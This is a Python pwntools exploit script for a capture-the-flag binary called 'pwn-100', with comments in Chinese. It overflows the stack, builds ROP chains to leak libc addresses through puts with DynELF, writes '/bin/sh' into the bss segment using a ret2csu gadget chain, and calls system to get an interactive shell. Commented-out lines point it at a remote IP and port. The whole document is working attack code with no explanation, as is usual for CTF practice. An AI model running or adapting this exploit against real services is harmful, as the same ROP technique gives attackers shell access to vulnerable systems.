from pwn import *

p = process("./pwn-100")
#p = remote("127.0.0.1", 8888)
#p = remote("220.249.52.134", 51679)
elf = ELF("./pwn-100")

# 后面代码中start_addr可以换成main_addr
start_addr = 0x400550
#main_addr = 0x4006B8
pop_rdi_addr = 0x400763
puts_addr = elf.symbols["puts"]

def leak(addr):
    # addr 为需要爆破的地址
    payload = cyclic(0x40 + 0x8)
    payload += p64(pop_rdi_addr) + p64(addr) + p64(puts_addr)
    payload += p64(start_addr)
    payload = payload.ljust(200, b"A")  # read padding
    p.send(payload)
    p.recvuntil(b"bye~\n")
    data = p.recv()

    data = data[:-1]
    if not data:
        data = b"\x00"
    data = data[:8]
    print("puts addr: ", data)
    return data

d = DynELF(leak, elf=ELF("./pwn-100"))
system_addr = d.lookup("system", "libc")

print("----------- leak addr --------------")
print("system addr:", hex(system_addr))

print("----------- write /bin/sh to bss --------------")
# 0x601050 和 0x601058地址起始处分别存放了stdin stdout
# 覆盖此处的地址会在导致返回main函数时出错，因为main函数引用了这两个变量
str_addr = 0x601060
pop6_addr = 0x40075a
movcall_addr = 0x400740

# --------------------- pop6_addr ---------------------
# pop     rbx    --> 0
# pop     rbp    --> 1
# pop     r12    --> func_addr
# pop     r13    --> rdx
# pop     r14    --> rsi
# pop     r15    --> rdi
# retn

# -------------------- movcall_addr -------------------
# mov     rdx, r13
# mov     rsi, r14
# mov     edi, r15d
# call    qword ptr [r12+rbx*8]

read_got = elf.got["read"]
payload = cyclic(0x40 + 0x8)
payload += p64(pop6_addr) + p64(0) + p64(1) + p64(read_got) + p64(8) + p64(str_addr) + p64(0) + p64(movcall_addr)
payload += cyclic(56)
payload += p64(start_addr)
payload =  payload.ljust(200, b"B")
p.send(payload)
p.recvuntil(b"bye~\n")
p.send("/bin/sh\x00")

print("----------- get shell --------------")
payload = cyclic(0x40 + 0x8)
payload += p64(pop_rdi_addr) + p64(str_addr) + p64(system_addr)
payload += p64(start_addr)
payload =  payload.ljust(200, b"B")
p.send(payload)
p.interactive()
